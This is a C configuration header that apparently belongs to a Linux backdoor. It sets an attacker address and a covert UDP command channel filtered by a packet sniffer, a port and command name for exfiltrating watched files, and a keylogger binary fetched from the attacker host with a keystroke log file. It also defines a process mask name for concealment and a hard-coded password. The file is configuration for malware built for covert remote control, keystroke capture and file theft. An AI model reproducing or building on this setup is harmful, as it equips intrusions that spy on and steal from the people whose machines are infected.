#ifndef CONFIG_H
#define CONFIG_H

#define MAX_DATA_SIZE 65535
#define MAX_BUFFER_SIZE 256
#define ZIP_NAME "enc.zip"

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#define NIC_NAME "wlan0"
#define LHOST "192.168.1.71"
#define CMD_CHANNEL_PORT 383
#define FILE_EXFILT_PORT 8080
#define HEADER_KEY "noob"
#define PASSWORD "password"

const char *watch_list[][2] = {
{"/root/Desktop/Test","test.txt"},
{"/root/Desktop/Test2","test2.txt"},
};

#define SNIFFER_FILTER "src host " LHOST " and udp dst port " STR(CMD_CHANNEL_PORT)
#define EXFILT_FUNC_NAME "exfilt-file "

#define KEYLOGGER_URL "192.168.1.71:7000"
#define KEYLOGGER_INSTALL_DIR "./"
#define KEYLOGGER_NAME "keylogger.elf"
#define SAVE_AT "./keystroke.txt"

#define MASK_NAME "hello"

#endif
